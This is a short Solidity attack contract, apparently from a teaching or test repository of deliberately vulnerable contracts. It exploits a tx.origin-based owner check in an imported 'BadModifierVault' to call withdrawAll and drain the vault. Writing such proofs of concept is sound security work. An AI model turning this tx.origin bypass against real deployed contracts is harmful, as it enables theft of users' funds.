// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "src/vulnerable/access-control/BadModifierVault.sol";

contract TXOriginByPassAttack {
  BadModifierVault public vault;
  address public attacker;

  constructor(address _vault) {
    vault = BadModifierVault(_vault);
    attacker = msg.sender;
  }
  function exploit() external {
    // This call passes because tx.origin == owner
    vault.withdrawAll();
  }
  receive() external payable {}

}
